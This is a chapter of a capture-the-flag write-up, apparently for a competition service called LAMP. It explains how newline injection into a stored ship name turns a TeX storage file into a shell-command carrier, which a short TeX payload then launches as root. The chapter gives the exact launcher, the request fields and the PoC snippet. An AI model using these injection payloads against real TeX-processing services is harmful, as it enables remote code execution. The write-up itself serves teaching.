@@ -1,0 +1,338 @@
+% ============================================================
+% 06 -- BYPASSING THE 32-BYTE LIMIT
+% ============================================================
+
+\section{Bypassing the 32-Byte Limit}
+\label{sec:carrier-bypass}
+
+The previous chapter ended in an awkward position.
+
+We had command execution as root inside the LAMP container, but the
+component type only gave us enough space for very small payloads.
+
+Something like:
+
+\begin{lstlisting}
+id>/x
+\end{lstlisting}
+
+was fine.
+
+Something useful for locating and extracting flags was not.
+
+Instead of trying to compress increasingly ridiculous shell commands
+into the component field, we looked for somewhere else to store them.
+
+
+% ------------------------------------------------------------
+% 6.1
+% ------------------------------------------------------------
+
+\subsection{Ship Names Were Stored as TeX Files}
+
+During registration, LAMP created a file for each user beneath
+\code{/storage}:
+
+\begin{lstlisting}
+\immediate\openout\shipfile=/storage/\postusername{}
+
+\store{\shipname}{\postshipname{}}
+
+\immediate\closeout\shipfile{}
+\end{lstlisting}
+
+The intention was simply to persist the chosen ship name.
+
+For a user named:
+
+\begin{lstlisting}
+Q
+\end{lstlisting}
+
+the corresponding file would live at approximately:
+
+\begin{lstlisting}
+/storage/Q.tex
+\end{lstlisting}
+
+and contain a definition of the ship-name macro.
+
+
+% ------------------------------------------------------------
+% 6.2
+% ------------------------------------------------------------
+
+\subsection{The Escaping Looked Reasonable}
+
+Before writing the ship name, LAMP attempted to escape characters that
+could interfere with the generated TeX:
+
+\begin{lstlisting}
+\StrSubstitute{#2}
+  {\stringbackslash}
+  {\string\Uchar92}
+  [\escaped]
+
+\StrSubstitute{\escaped}
+  {\stringcurlyopen}
+  {\string\Uchar123}
+  [\escaped]
+
+\StrSubstitute{\escaped}
+  {\stringcurlyclose}
+  {\string\Uchar125}
+  [\escaped]
+
+\StrSubstitute{\escaped}
+  {\stringsub}
+  {\string\Uchar95}
+  [\escaped]
+
+\StrSubstitute{\escaped}
+  {\stringsup}
+  {\string\Uchar94}
+  [\escaped]
+\end{lstlisting}
+
+So characters such as:
+
+\begin{lstlisting}
+\  {  }  _  ^
+\end{lstlisting}
+
+were transformed before being written.
+
+There was, however, one useful character missing from that list:
+
+\begin{center}
+  \displayfont\bfseries
+  newline.
+\end{center}
+
+
+% ------------------------------------------------------------
+% 6.3
+% ------------------------------------------------------------
+
+\subsection{Newline Injection}
+
+A ship name beginning with a newline could therefore change the physical
+layout of the generated file.
+
+Conceptually, registering a ship name like:
+
+\begin{lstlisting}
+
+ls /storage>/x;:
+\end{lstlisting}
+
+could produce a file resembling:
+
+\begin{lstlisting}
+\def \shipname {
+ls /storage>/x;:}
+\end{lstlisting}
+
+As TeX, this file was malformed enough to be inconvenient.
+
+As a shell script, however, the middle of it contained something much
+more useful:
+
+\begin{lstlisting}
+ls /storage>/x
+\end{lstlisting}
+
+The surrounding TeX syntax could fail.
+
+The shell command in the middle had already executed.
+
+
+% ------------------------------------------------------------
+% 6.4
+% ------------------------------------------------------------
+
+\subsection{The Storage File Became a Command Carrier}
+
+This gave us a way to separate the exploit into two pieces.
+
+The long command lived inside the user's storage file:
+
+\begin{lstlisting}
+/storage/Q.tex
+\end{lstlisting}
+
+The tiny component-type payload only needed to launch it:
+
+\begin{lstlisting}
+^^5cUseName{@@input}|"sh /s*/Q*"
+\end{lstlisting}
+
+After TeX processing, the important part became:
+
+\begin{lstlisting}
+\UseName{@@input}|"sh /s*/Q*"
+\end{lstlisting}
+
+The shell glob:
+
+\begin{lstlisting}
+/s*/Q*
+\end{lstlisting}
+
+was a compact way of reaching the attacker-created file under
+\code{/storage} without spending the limited payload budget on the
+entire path.
+
+
+% ------------------------------------------------------------
+% 6.5
+% ------------------------------------------------------------
+
+\subsection{Why This Solved the Payload Problem}
+
+The exploit now had two stages:
+
+\begin{center}
+\begin{tabular}{p{0.28\textwidth} p{0.58\textwidth}}
+  \toprule
+  \textbf{Stage} & \textbf{Purpose} \\
+  \midrule
+
+  Registration &
+  Store an arbitrarily longer shell command inside
+  \code{/storage/<user>.tex}. \\[0.6em]
+
+  Component injection &
+  Use the tiny TeX RCE primitive only to execute that file with
+  \code{sh}. \\
+
+  \bottomrule
+\end{tabular}
+\end{center}
+
+The constrained field no longer needed to contain the real payload.
+
+It only needed to contain a launcher.
+
+\begin{findingbox}
+The 32-byte component-type limit restricted the size of the direct TeX
+payload, but it did not restrict the size of commands already present
+elsewhere on disk.
+
+Newline injection in persisted ship names turned
+\code{/storage/<user>.tex} into a reusable shell-command carrier.
+\end{findingbox}
+
+
+% ------------------------------------------------------------
+% 6.6
+% ------------------------------------------------------------
+
+\subsection{How the PoC Created a Carrier}
+
+The automated exploit eventually reduced carrier creation to:
+
+\begin{lstlisting}
+ship=$'\n'"$shellcmd"
+\end{lstlisting}
+
+The resulting value was URL-encoded and sent during registration:
+
+\begin{lstlisting}
+username=Q
+password=mof
+shipname=<newline><shell command>
+\end{lstlisting}
+
+Once registration succeeded, the component injection triggered the
+carrier:
+
+\begin{lstlisting}
+action=add
+x=10
+y=10
+typ=^^5cUseName{@@input}|"sh%20/s*/Q*"
+\end{lstlisting}
+
+The \code{\%20} is important here.
+
+LAMP's POST form parser percent-decoded values, but unlike the query
+parser it did not convert a literal \code{+} into a space.
+
+Using:
+
+\begin{lstlisting}
+sh+/s*/Q*
+\end{lstlisting}
+
+would therefore not reliably produce:
+
+\begin{lstlisting}
+sh /s*/Q*
+\end{lstlisting}
+
+Using \code{\%20} did.
+
+
+% ------------------------------------------------------------
+% 6.7
+% ------------------------------------------------------------
+
+\subsection{One Small Operational Caveat}
+
+The short launcher relied on shell globbing:
+
+\begin{lstlisting}
+/s*/Q*
+\end{lstlisting}
+
+This was useful during the competition because every saved byte mattered.
+
+It was not particularly elegant.
+
+If multiple matching paths existed, shell expansion could produce more
+than one argument and make the launcher unreliable.
+
+\begin{limitationbox}
+The short glob-based launcher was a competition optimization, not a
+general-purpose robust execution method.
+
+The cleaned PoC should prefer deterministic paths whenever the payload
+budget allows it.
+\end{limitationbox}
+
+
+% ------------------------------------------------------------
+% 6.8
+% ------------------------------------------------------------
+
+\subsection{The Final Primitive}
+
+At this point, the exploit had everything required for useful command
+execution:
+
+\begin{center}
+  \displayfont
+  register account
+  $\longrightarrow$
+  newline in ship name
+  $\longrightarrow$
+  shell carrier in \code{/storage}
+  $\longrightarrow$
+  tiny \code{typ} launcher
+  $\longrightarrow$
+  root command
+  $\longrightarrow$
+  output file
+  $\longrightarrow$
+  \code{Path:} retrieval
+\end{center}
+
+The remaining question was no longer how to execute commands.
+
+It was:
+
+\begin{center}
+  \displayfont\large\bfseries
+  where the hell does LAMP actually keep the flags?
+\end{center}
